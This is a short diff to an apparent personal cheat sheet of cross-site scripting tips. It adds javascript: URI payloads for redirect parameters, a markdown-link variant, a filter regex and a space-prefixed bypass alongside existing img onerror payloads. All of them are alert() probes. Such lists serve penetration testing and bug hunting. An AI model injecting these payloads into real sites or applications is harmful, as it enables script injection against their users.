@@ -1,5 +1,13 @@
 tips for xxs
 without parantheses
+XSS в Redirect:
+```
+javascript:alert(document.domain)
+[a](javascript:alert(document.domain))
+^(?!javascript:).+
+%20javascript:alert()
+```
+
 ```js
 <img src=1 onerror=alert(1)>
 #<img src=1 onerror=alert(1)>
